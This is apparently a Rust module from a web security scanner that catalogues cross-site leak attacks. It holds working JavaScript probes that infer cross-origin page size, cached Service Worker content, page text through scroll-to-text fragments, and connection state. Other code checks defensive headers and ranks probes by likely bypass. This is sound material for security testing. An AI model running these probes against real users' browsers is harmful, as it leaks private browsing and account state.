fn size_based_probes() -> Vec<XsLeakProbe> {
    vec![XsLeakProbe {
        id: "sb-001".into(),
        category: XsLeakCategory::SizeBasedLeak,
        name: "Cross-origin response size via timing".into(),
        description: "Fetch timing correlates with response body size. \
            Authenticated endpoints often return larger responses \
            (user data, dashboard HTML) than unauthenticated ones \
            (login page, 302). Statistical analysis of fetch duration \
            across multiple samples reveals size bracket."
            .into(),
        inclusion_method: InclusionMethod::FetchNoCors,
        observable: Observable::ResponseSize,
        html_payload: String::new(),
        js_payload: r#"async function probeSizeTiming(url, samples) {
  const n = samples || 20;
  const timings = [];

  for (let i = 0; i < n; i++) {
    const t0 = performance.now();
    try {
      await fetch(url + '?_s=' + i, { mode: 'no-cors', cache: 'no-store' });
    } catch(e) {}
    const t1 = performance.now();
    timings.push(t1 - t0);
  }

  // Remove outliers (IQR method)
  timings.sort((a, b) => a - b);
  const q1 = timings[Math.floor(n * 0.25)];
  const q3 = timings[Math.floor(n * 0.75)];
  const iqr = q3 - q1;
  const filtered = timings.filter(t => t >= q1 - 1.5*iqr && t <= q3 + 1.5*iqr);

  const mean = filtered.reduce((a, b) => a + b, 0) / filtered.length;
  const variance = filtered.reduce((a, b) => a + (b - mean)**2, 0) / filtered.length;
  const stddev = Math.sqrt(variance);

  return {
    mean_ms: mean,
    stddev_ms: stddev,
    median_ms: filtered[Math.floor(filtered.length / 2)],
    samples: filtered.length,
    size_estimate: mean < 50 ? 'tiny' : mean < 200 ? 'small' : mean < 500 ? 'medium' : 'large'
  };
}"#
        .into(),
        timing_threshold: Duration::from_millis(50),
        defenses: vec![XsLeakDefense::SameSiteCookies, XsLeakDefense::Corp],
    }]
}

fn service_worker_probes() -> Vec<XsLeakProbe> {
    vec![XsLeakProbe {
        id: "sw-001".into(),
        category: XsLeakCategory::ServiceWorkerLeak,
        name: "Service Worker cache partition timing".into(),
        description: "Service Workers can cache responses per-origin. \
            By timing navigation to a target URL, an attacker can detect \
            whether the Service Worker serves a cached response (fast) or \
            fetches from network (slow). This reveals if the user has \
            previously visited and triggered the SW to cache content."
            .into(),
        inclusion_method: InclusionMethod::Iframe,
        observable: Observable::EventTiming,
        html_payload: String::new(),
        js_payload: r#"async function probeServiceWorkerCache(url) {
  const iterations = 5;
  const timings = [];

  for (let i = 0; i < iterations; i++) {
    const f = document.createElement('iframe');
    f.style.display = 'none';
    const t0 = performance.now();

    await new Promise((resolve) => {
      f.onload = resolve;
      f.onerror = resolve;
      f.src = url + '?_sw=' + i;
      document.body.appendChild(f);
      setTimeout(resolve, 5000);
    });

    const t1 = performance.now();
    timings.push(t1 - t0);
    f.remove();
  }

  timings.sort((a, b) => a - b);
  const median = timings[Math.floor(iterations / 2)];
  const first = timings[0];

  return {
    median_ms: median,
    first_load_ms: first,
    sw_cached_hint: first < median * 0.5,
    timings: timings
  };
}"#
        .into(),
        timing_threshold: Duration::from_millis(200),
        defenses: vec![XsLeakDefense::SameSiteCookies, XsLeakDefense::Corp],
    }]
}

fn text_fragment_probes() -> Vec<XsLeakProbe> {
    vec![XsLeakProbe {
        id: "tf-001".into(),
        category: XsLeakCategory::TextFragmentLeak,
        name: "Scroll-to-text fragment detection".into(),
        description: "Navigate iframe to URL#:~:text=SECRET. If the text \
            exists in the page, Chrome scrolls to it. Detect scrolling \
            via IntersectionObserver or scroll event timing. This is a \
            text-search oracle: ask 'does this page contain X?' for any X."
            .into(),
        inclusion_method: InclusionMethod::Iframe,
        observable: Observable::ScrollPosition,
        html_payload: String::new(),
        js_payload: r#"async function probeTextFragment(url, searchText) {
  const fragmentUrl = url + '#:~:text=' + encodeURIComponent(searchText);

  return new Promise((resolve) => {
    const f = document.createElement('iframe');
    f.style.cssText = 'width:800px;height:100px;position:absolute;left:-9999px';
    f.src = fragmentUrl;

    let scrollDetected = false;
    const t0 = performance.now();

    f.onload = () => {
      // Technique: measure load time difference.
      // Scroll-to-text adds processing time when text is found.
      const loadTime = performance.now() - t0;

      // Alternative: try to detect focus ring via :target pseudo-class timing
      setTimeout(() => {
        f.remove();
        resolve({
          load_time_ms: loadTime,
          scroll_detected: scrollDetected,
          search_text: searchText,
          text_likely_present: loadTime > 150  // heuristic threshold
        });
      }, 1000);
    };

    document.body.appendChild(f);
    setTimeout(() => { f.remove(); resolve({ timeout: true }); }, 8000);
  });
}"#
        .into(),
        timing_threshold: Duration::from_millis(50),
        defenses: vec![XsLeakDefense::FrameProtection, XsLeakDefense::Coop],
    }]
}

fn connection_pool_probes() -> Vec<XsLeakProbe> {
    vec![XsLeakProbe {
        id: "cp-001".into(),
        category: XsLeakCategory::ConnectionPoolLeak,
        name: "Socket pool exhaustion timing".into(),
        description: "Browsers limit concurrent connections per origin \
            (typically 6). Exhaust the pool with 5 pending connections, \
            then time a 6th. If the target already has an open connection \
            (e.g., WebSocket, long-poll), the 6th will queue longer, \
            revealing the target's connection state."
            .into(),
        inclusion_method: InclusionMethod::FetchNoCors,
        observable: Observable::ConnectionTiming,
        html_payload: String::new(),
        js_payload: r#"async function probeConnectionPool(targetOrigin, endpoint) {
  const blockingUrl = targetOrigin + (endpoint || '/');
  const holders = [];

  // Open 5 long-lived connections to saturate the pool
  for (let i = 0; i < 5; i++) {
    const controller = new AbortController();
    const p = fetch(blockingUrl + '?_block=' + i, {
      mode: 'no-cors',
      signal: controller.signal
    }).catch(() => {});
    holders.push({ promise: p, controller: controller });
  }

  await new Promise(r => setTimeout(r, 500));

  // Time the 6th connection — if pool is already partially used,
  // this will queue for longer
  const t0 = performance.now();
  try {
    await fetch(blockingUrl + '?_probe=1', { mode: 'no-cors' });
  } catch(e) {}
  const t1 = performance.now();
  const probeTime = t1 - t0;

  // Clean up blocking connections
  holders.forEach(h => h.controller.abort());

  return {
    probe_time_ms: probeTime,
    pool_contention: probeTime > 1000,
    existing_connections_likely: probeTime > 2000,
    pool_size_hint: probeTime > 500 ? 'saturated' : 'available'
  };
}"#
        .into(),
        timing_threshold: Duration::from_millis(500),
        defenses: vec![XsLeakDefense::SameSiteCookies],
    }]
}

/// Analyze response headers for XS-Leak defenses present.
pub fn detect_defenses(headers: &HashMap<String, String>) -> Vec<XsLeakDefense> {
    let mut found = Vec::new();
    let lower: HashMap<String, String> = headers
        .iter()
        .map(|(k, v)| (k.to_lowercase(), v.to_lowercase()))
        .collect();

    if lower.get("x-frame-options").is_some()
        || lower
            .get("content-security-policy")
            .is_some_and(|v| v.contains("frame-ancestors"))
    {
        found.push(XsLeakDefense::FrameProtection);
    }
    if lower
        .get("cross-origin-opener-policy")
        .is_some_and(|v| v.contains("same-origin"))
    {
        found.push(XsLeakDefense::Coop);
    }
    if lower
        .get("cross-origin-resource-policy")
        .is_some_and(|v| v.contains("same-origin") || v.contains("same-site"))
    {
        found.push(XsLeakDefense::Corp);
    }
    if lower
        .get("cross-origin-embedder-policy")
        .is_some_and(|v| v.contains("require-corp"))
    {
        found.push(XsLeakDefense::Coep);
    }
    if lower
        .get("set-cookie")
        .is_some_and(|v| v.contains("samesite=strict") || v.contains("samesite=lax"))
    {
        found.push(XsLeakDefense::SameSiteCookies);
    }
    if lower
        .get("cache-control")
        .is_some_and(|v| v.contains("no-store"))
    {
        found.push(XsLeakDefense::NoCacheStore);
    }
    if lower.get("vary").is_some_and(|v| v.contains("cookie")) {
        found.push(XsLeakDefense::VaryCookie);
    }
    if lower
        .get("content-type")
        .is_some_and(|v| v.contains("charset="))
    {
        found.push(XsLeakDefense::ExplicitContentType);
    }

    found
}

/// Determine which XS-Leak categories remain viable given the detected defenses.
pub fn viable_categories(defenses: &[XsLeakDefense]) -> Vec<XsLeakCategory> {
    let catalog = generate_probe_catalog();
    let mut viable = Vec::new();
    let mut seen = std::collections::HashSet::new();

    for probe in &catalog {
        if seen.contains(&probe.category) {
            continue;
        }
        let blocked = probe.defenses.iter().all(|d| defenses.contains(d));
        if !blocked {
            seen.insert(probe.category);
            viable.push(probe.category);
        }
    }

    viable
}

/// Compare two observations (one authenticated, one unauthenticated)
/// and detect information leakage signals.
pub fn analyze_differential(
    category: XsLeakCategory,
    auth_obs: &XsLeakObservation,
    unauth_obs: &XsLeakObservation,
) -> XsLeakDifferential {
    let (signal_detected, signal_strength, description) = match category {
        XsLeakCategory::FrameCounting => {
            let auth_frames = auth_obs.frame_count.unwrap_or(0);
            let unauth_frames = unauth_obs.frame_count.unwrap_or(0);
            let diff = (auth_frames as i64 - unauth_frames as i64).unsigned_abs() as f64;
            let detected = auth_frames != unauth_frames;
            let desc = format!(
                "Authenticated frame count: {}, unauthenticated: {}. Delta: {}",
                auth_frames, unauth_frames, diff
            );
            (detected, diff.min(1.0), desc)
        }

        XsLeakCategory::ErrorEventDetection => {
            let detected = auth_obs.has_error_event != unauth_obs.has_error_event;
            let strength = if detected { 1.0 } else { 0.0 };
            let desc = format!(
                "Auth error_event: {}, unauth: {}. Differential: {}",
                auth_obs.has_error_event, unauth_obs.has_error_event, detected
            );
            (detected, strength, desc)
        }

        XsLeakCategory::CacheTimingProbe => {
            let auth_cached = auth_obs.cached.unwrap_or(false);
            let unauth_cached = unauth_obs.cached.unwrap_or(false);
            let detected = auth_cached != unauth_cached;
            let strength = if detected { 0.8 } else { 0.0 };
            let desc = format!(
                "Auth cached: {}, unauth cached: {}. Cache differential: {}",
                auth_cached, unauth_cached, detected
            );
            (detected, strength, desc)
        }

        XsLeakCategory::RedirectCounting => {
            let diff =
                (auth_obs.redirect_count as i64 - unauth_obs.redirect_count as i64).unsigned_abs();
            let detected = diff > 0;
            let strength = (diff as f64 / 3.0).min(1.0);
            let desc = format!(
                "Auth redirects: {}, unauth: {}. Delta: {}",
                auth_obs.redirect_count, unauth_obs.redirect_count, diff
            );
            (detected, strength, desc)
        }

        XsLeakCategory::ContentTypeSniffing => {
            let auth_ct = auth_obs.content_type.as_deref().unwrap_or("unknown");
            let unauth_ct = unauth_obs.content_type.as_deref().unwrap_or("unknown");
            let detected = auth_ct != unauth_ct;
            let strength = if detected { 0.9 } else { 0.0 };
            let desc = format!(
                "Auth content-type: '{}', unauth: '{}'. Different: {}",
                auth_ct, unauth_ct, detected
            );
            (detected, strength, desc)
        }

        XsLeakCategory::PerformanceApiLeak => {
            let auth_time = auth_obs.response_time.as_millis() as f64;
            let unauth_time = unauth_obs.response_time.as_millis() as f64;
            let ratio = if unauth_time > 0.0 {
                auth_time / unauth_time
            } else {
                1.0
            };
            let detected = ratio > 1.5 || ratio < 0.67;
            let strength = ((ratio - 1.0).abs() / 2.0).min(1.0);
            let desc = format!(
                "Auth response {}ms, unauth {}ms. Ratio: {:.2}",
                auth_time, unauth_time, ratio
            );
            (detected, strength, desc)
        }

        XsLeakCategory::SizeBasedLeak => {
            let auth_size = auth_obs.content_length.unwrap_or(0);
            let unauth_size = unauth_obs.content_length.unwrap_or(0);
            let diff = (auth_size as i64 - unauth_size as i64).unsigned_abs() as f64;
            let max_size = auth_size.max(unauth_size).max(1) as f64;
            let ratio = diff / max_size;
            let detected = ratio > 0.2;
            let desc = format!(
                "Auth size: {} bytes, unauth: {} bytes. Size ratio: {:.2}",
                auth_size, unauth_size, ratio
            );
            (detected, ratio.min(1.0), desc)
        }

        XsLeakCategory::PostMessageLeak
        | XsLeakCategory::WindowPropertyLeak
        | XsLeakCategory::ServiceWorkerLeak
        | XsLeakCategory::TextFragmentLeak
        | XsLeakCategory::ConnectionPoolLeak => {
            let time_diff = (auth_obs.response_time.as_millis() as f64
                - unauth_obs.response_time.as_millis() as f64)
                .abs();
            let status_diff = auth_obs.status_code != unauth_obs.status_code;
            let detected = status_diff || time_diff > 200.0;
            let strength = if status_diff {
                1.0
            } else {
                (time_diff / 1000.0).min(1.0)
            };
            let desc = format!(
                "Auth status: {}, unauth: {}. Time delta: {:.0}ms",
                auth_obs.status_code, unauth_obs.status_code, time_diff
            );
            (detected, strength, desc)
        }
    };

    XsLeakDifferential {
        category,
        authenticated: auth_obs.clone(),
        unauthenticated: unauth_obs.clone(),
        signal_detected,
        signal_strength,
        description,
    }
}

/// Full XS-Leak analysis report for a target endpoint.
#[derive(Debug, Clone)]
pub struct XsLeakReport {
    pub target_url: String,
    pub defenses_detected: Vec<XsLeakDefense>,
    pub viable_leak_categories: Vec<XsLeakCategory>,
    pub differentials: Vec<XsLeakDifferential>,
    pub applicable_probes: Vec<XsLeakProbe>,
    pub risk_score: f64,
    pub summary: String,
}

/// Build a complete XS-Leak analysis for a target, given its response
/// headers and authenticated/unauthenticated observations.
pub fn analyze_target(
    target_url: &str,
    headers: &HashMap<String, String>,
    observations: &[(XsLeakCategory, XsLeakObservation, XsLeakObservation)],
) -> XsLeakReport {
    let defenses = detect_defenses(headers);
    let viable = viable_categories(&defenses);
    let catalog = generate_probe_catalog();

    let applicable: Vec<XsLeakProbe> = catalog
        .into_iter()
        .filter(|p| viable.contains(&p.category))
        .collect();

    let differentials: Vec<XsLeakDifferential> = observations
        .iter()
        .map(|(cat, auth, unauth)| analyze_differential(*cat, auth, unauth))
        .collect();

    let detected_count = differentials.iter().filter(|d| d.signal_detected).count();
    let total = differentials.len().max(1) as f64;
    let avg_strength: f64 = if differentials.is_empty() {
        0.0
    } else {
        differentials.iter().map(|d| d.signal_strength).sum::<f64>() / total
    };

    let defense_penalty = defenses.len() as f64 * 0.1;
    let risk_score = ((detected_count as f64 / total) * 0.6 + avg_strength * 0.4 - defense_penalty)
        .clamp(0.0, 1.0);

    let leak_names: Vec<String> = differentials
        .iter()
        .filter(|d| d.signal_detected)
        .map(|d| d.category.to_string())
        .collect();

    let summary = if leak_names.is_empty() {
        format!(
            "No XS-Leak signals detected for {}. {} defenses present: {}.",
            target_url,
            defenses.len(),
            defenses
                .iter()
                .map(|d| d.to_string())
                .collect::<Vec<_>>()
                .join(", ")
        )
    } else {
        format!(
            "Detected {} XS-Leak signals for {}: [{}]. {} defenses present. \
             {} probe categories remain viable. Risk score: {:.2}.",
            leak_names.len(),
            target_url,
            leak_names.join(", "),
            defenses.len(),
            viable.len(),
            risk_score
        )
    };

    XsLeakReport {
        target_url: target_url.to_string(),
        defenses_detected: defenses,
        viable_leak_categories: viable,
        differentials,
        applicable_probes: applicable,
        risk_score,
        summary,
    }
}

/// Estimate which XS-Leak probes are most likely to succeed
/// against a given defense configuration, sorted by success probability.
pub fn rank_probes_by_likelihood(defenses: &[XsLeakDefense]) -> Vec<(XsLeakProbe, f64)> {
    let catalog = generate_probe_catalog();
    let mut ranked: Vec<(XsLeakProbe, f64)> = catalog
        .into_iter()
        .map(|probe| {
            let defended = probe
                .defenses
                .iter()
                .filter(|d| defenses.contains(d))
                .count();
            let total_defenses = probe.defenses.len().max(1);
            let bypass_probability = 1.0 - (defended as f64 / total_defenses as f64);
            (probe, bypass_probability)
        })
        .collect();

    ranked.sort_by(|a, b| b.1.partial_cmp(&a.1).unwrap_or(std::cmp::Ordering::Equal));
    ranked
}

#[cfg(test)]
#[path = "xs_leaks_test.rs"]
mod tests;
